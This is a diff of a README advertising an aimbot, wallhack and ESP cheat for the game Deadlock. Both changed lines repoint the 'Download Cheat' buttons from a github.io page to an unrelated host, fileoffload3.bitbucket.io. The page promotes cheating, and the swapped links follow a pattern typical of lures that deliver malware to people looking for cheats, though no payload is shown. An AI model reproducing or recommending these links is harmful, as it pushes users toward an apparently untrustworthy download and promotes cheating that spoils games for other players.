@@ -6,7 +6,7 @@
 
 ESP, aimbot, wallhack, speed, and more — all ready to load in.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🔥 Deadlock Cheat Features (Full Breakdown)
@@ -43,7 +43,7 @@ ESP, aimbot, wallhack, speed, and more — all ready to load in.
 * ✅ **Anti-Flash / Blind Immunity** – See clearly always
 * ✅ **No Fall Damage** – Abuse high-ground mechanics safely
 
-[![Download Cheat](https://i.ytimg.com/vi/Cb5mXavGgC8/maxresdefault.jpg)](https://wecheaters.github.io/cheats/deadlock/)
+[![Download Cheat](https://i.ytimg.com/vi/Cb5mXavGgC8/maxresdefault.jpg)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🎮 Deadlock Cheat vs Vanilla Play
